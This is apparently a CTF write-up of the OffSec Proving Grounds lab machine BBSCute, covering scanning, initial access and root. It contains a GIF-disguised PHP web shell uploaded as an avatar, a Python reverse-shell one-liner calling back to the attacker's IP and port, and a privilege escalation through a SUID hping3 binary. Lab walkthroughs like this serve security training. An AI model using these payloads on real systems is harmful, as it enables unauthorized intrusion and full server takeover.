---
title: "Proving grounds Play: BBSCute"
layout: post
date: 2023-09-30 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04d06ec4ba4a315a6fb3eeb81bed5ab7 (RSA)
|   256 24b3df010bcac2ab2ee949b058086afa (ECDSA)
|_  256 6ac4356a7a1e7e51855b815c7c744984 (ED25519)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp  open  http     nginx 1.14.2
|_http-title: 404 Not Found
|_http-server-header: nginx/1.14.2
110/tcp open  pop3     Courier pop3d
995/tcp open  ssl/pop3 Courier pop3d
```

## 80/tcp - open  http - Apache httpd 2.4.38 ((Debian))

```sh
naveenj@hackerspace:|00:36|~/pg-play/BBSCute$ dirsearch -u http://192.168.151.128/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r -t 60 --full-url

Target: http://192.168.151.128/

[00:37:05] Starting: 
[00:37:21] 301 -  317B  - http://192.168.151.128/core  ->  http://192.168.151.128/core/     (Added to queue)
[00:37:23] 301 -  317B  - http://192.168.151.128/docs  ->  http://192.168.151.128/docs/     (Added to queue)
[00:37:24] 200 -    1KB - http://192.168.151.128/favicon.ico
[00:37:27] 200 -   10KB - http://192.168.151.128/index.html
[00:37:28] 200 -    6KB - http://192.168.151.128/index.php  #login page
```

## http://192.168.151.128/index.php

![img](/assets/images/CTF/Proving_Grounds/BBSCute/web.png)

Register ➡️ login ➡️ Upload Avatar ➡️ upload reverse shell/php code execution code as avatar.

***Note:*** In order to do a successfull registration the CAPTCHA must be sumitted and which is not available on the registration page. So it can be obtained by viewing the CAPTCHA page source `view-source:http://192.168.151.128/captcha.php`

**Upload.php**

```sh
GIF98;
<?php
echo "<pre>";
system($_GET['cmd']);
echo "</pre>";
?>
```

**Trigger Payload**: `http://192.168.151.128/uploads/avatar_naveenj_upload.php?cmd=id`

Check the python version using `which python` command the create the reverse shell code.

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.204",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

## Initial Foothold

```sh
naveenj@hackerspace:|01:17|~/pg-play/BBSCute$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.151.128] 60944
www-data@cute:/var/www/html/uploads$ 
```

## Privilege Escalation

Enumerate user executable permissions using `sudo -l`.

```sh
www-data@cute:/$ sudo -l    #check executable permissions
sudo -l
Matching Defaults entries for www-data on cute:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on cute:
    (root) NOPASSWD: /usr/sbin/hping3 --icmp    
    www-data@cute:/$ ls -al /usr/sbin/hping3
ls -al /usr/sbin/hping3
-rwsr-sr-x 1 root root 156808 Sep  6  2014 /usr/sbin/hping3
```

The binary can be run as root without password.

```sh
www-data@cute:/$ hping3
hping3
hping3> whoami
whoami
root    #root obtained
hping3> id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
hping3>
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).